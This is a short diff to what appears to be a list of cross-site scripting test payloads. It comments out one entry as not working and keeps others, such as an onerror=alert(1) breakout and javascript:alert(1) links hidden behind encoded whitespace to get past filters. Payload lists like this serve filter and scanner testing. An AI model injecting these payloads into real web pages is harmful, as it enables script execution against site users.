@@ -73,7 +73,8 @@ x" onerror=alert(1);>
 
 <a href="&#x20;javascript:alert(1)" >
 
-<a href="&nbsp;javascript:alert(1)" >
+# does not work
+#<a href="&nbsp;javascript:alert(1)" >
 
 <a href="&#X20;javascript:alert(1)" >
 
